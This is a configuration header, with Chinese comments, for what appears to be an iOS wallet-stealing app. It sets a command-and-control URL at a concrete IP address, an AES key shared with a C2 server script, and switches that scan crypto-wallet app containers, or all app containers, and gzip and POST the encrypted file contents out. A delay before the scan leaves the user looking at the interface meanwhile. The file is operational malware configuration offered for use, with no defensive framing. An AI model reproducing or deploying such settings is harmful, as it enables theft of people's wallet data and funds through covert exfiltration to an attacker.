//
//  Config.h
//  编译前改这里
//
#ifndef Config_h
#define Config_h

// ── 必须改这两项 ─────────────────────────────────────────
// 1. App Group 标识符。必须是你在 Apple Developer 后台建的、
//    并且已绑定到本 App 的 App ID 上的那个。开头是 group.
#define kAppGroup   @"group.com.trxstation.wq"

// 2. C2 接收地址。App 会把 AES 加密后的结果 POST 到这里。
#define kC2URL      @"http://206.187.220.116:8889/api/collect"

// ── AES-256 密钥（64 位 hex，与 c2_server.py 的 C2_AES_KEY 一致）──
#define kAESKeyHex  @"4dd44f6f284984fe06a202b8721471d27fa32a47dae97e188962863a2f9af246"

// ── 行为开关 ─────────────────────────────────────────────
// YES = 只扫已知钱包 App（快，几十秒）
// NO  = 扫全部 App 容器（慢，几分钟，产出大）
#define kWalletOnly         YES

// 每个文件最大读取字节，超过跳过（避免把视频之类也读进来）
#define kMaxFileBytes       (8 * 1024 * 1024)

// 单个容器最多遍历多少个文件
#define kMaxFilesPerContainer   4000

// 上传前是否 gzip 压缩
#define kGzipUpload         YES

// 扫描完成后展示结果 UI
#define kShowResults        YES

// 首次启动延迟多少秒开始扫（留时间给用户看界面）
#define kScanDelaySeconds   2.0

#endif
